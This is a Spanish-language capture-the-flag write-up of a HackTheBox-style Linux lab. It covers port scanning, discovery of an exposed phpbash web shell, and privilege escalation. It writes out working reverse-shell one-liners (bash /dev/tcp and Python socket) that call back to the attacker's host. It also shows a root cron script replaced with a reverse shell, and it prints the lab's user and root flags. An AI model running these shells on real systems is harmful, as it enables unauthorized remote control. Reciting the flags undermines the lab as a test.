![[20250705153021.png]]

# Nmap

>iniciamos con un escaneo basico de puertos con nmap

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.129.197.9 -oN scanner
```

![[20250705135441.png]]

>Continuamos con un escáner con scripts básicos para sacar servicios y versiones

```bash
nmap -p80 -sCV 10.129.197.9 -oN targeted
```

![[20250705135536.png]]

# Puerto 80

>revisamos que hay en la pagina web que corre por el puerto 80

![[20250705135627.png]]

>revisamos la web pero a primera vista no hay gran cosa 

![[20250705135759.png]]

lo que si que vemos en la pagina web es que hay algun tipo de consola interactiva en la URL IP/uploads/phpbash.php

![[ 20250705135903.png]]

>pero al acceder no funciona la pagina por lo que podemos entender que si aun existe ya no esta en el directorio uploads

![[ 20250705135956.png]]

>Nos indican un repositorio github donde parece que explican el funcionamiento de esta herramienta y tenemos un usuario a la vista "Arrexel"


![[ 20250705140110.png]]

vemos que tiene dos programas que hacen lo mismo phpbash.php y phpbash.min.php que se encuentran en el  navegador


## Gobuster

>Utilizamos gobuster para buscar directorios en la pagina web

```bash
gobuster dir -u 10.129.197.9 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,py,sh -t 40
```

![[ 20250705140304.png]]

>Nos devuelve varios directorios y tras explorarlos un poco encontramos en dev lo siguiente:

![[ 20250705140342.png]]

>Hemos encontrado la consola interactiva

## phpbash.php

![[ 20250705140421.png]]

tratamos de mandar un ping a ver si la consola es capaz de interactuar con mi equipo

>Desde nuestra terminal nos ponemos en escucha de paquetes


```bash
tcpdump -i any icmp
```

![[20250705140711.png]]

y desde phpbash.php lanzamos el ping

```bash
ping -c 1 10.10.14.155
```

![[20250705140758.png]]

vemos que el paquete se tramita

![[20250705140816.png]]

y en  nuestra terminal recibimos la petición

por lo que es momento de tratar de enviar una shell


## Shell

>probamos a lanzar una shell con bash 

```bash
bash -c "bash -i &> /dev/tcp/192.168.1.175/1234 0>&1" 
```

mientras en nuestra terminal la esperamos con 

```bash
nc -nlvp 1234
```



![[20250705141401.png]]

>La shell parece mandarse pero no recibimos nada por el puerto en escucha


revisamos si tiene python instalado 

```bash
which python
```

![[20250705141439.png]]

>comprobamos que si lo tiene

probamos lanzar una shell con python hacia nuestro puerto en escucha

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.155",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![[20250705145256.png]]

>ahora si que tenemos la shell en nuestra terminal 

### Sanitizar la shell

> como sabemos que tiene python vamos a utilizarlo para sanitizar la shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

>ctrl + Z

```bash
stty raw -echo; fg
```

```bash
export TERM=xterm
```

```bash
stty rows 36 columns 140
```

>ahora si con una shell mas practica ya podemos trabajar

## Escalada de privilegios

>Utilizamos sudo -l y asi hacemos el primer reconocimiento

```bash
sudo -l
```

![[20250705145632.png]]

vemos que podemos usar el usuario scriptmanager sin contraseña

así que vamos a ver que podemos hacer con este usuario

>pivotamos al usuario scriptmanager

```bash
sudo -u scriptmanager /bin/bash -i
```

>Al explorar el directorio home encontramos el usuario arrexel el cual contiene la primera flag 

![[20250705145939.png]]

>seguimos explorando y vemos un archivo en la / raiz llamado scripts del cual somos propietarios con el usuario actual

![[20250705150044.png]]

![[20250705150103.png]]

>investigamos el archivo test.py

![[20250705150140.png]]


>vemos que genera un archivo .txt que como vimos en el directorio scripts el propietario es root por lo que suponemos que root es quien crea ese archivo

>Creamos un pequeño script de python para tratar de inyectar una shell que al ser creada por root esperemos que nos de esa shell con usuario root

![[20250705150402.png]]

```python
import socket, subprocess, os;

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s.connect(("10.10.14.155",6666));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);

f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

>Nos ponemos en escucha para ver si recibimos la shell


```bash
nc -nlvp 6666
```

>lanzamos el script de python

```bash
python test.py
```

![[20250705151139.png]]

>Y ahi tenemos la shell como root

>vamos al directorio principal de root y ahi podemos ver la flag

![[20250705151252.png]]

# Flags

user.txt = 59f508119c6a8ff7a2f51be2dffccea1

root.txt = 7879c3fb5f18ec2c8e923829e742e83e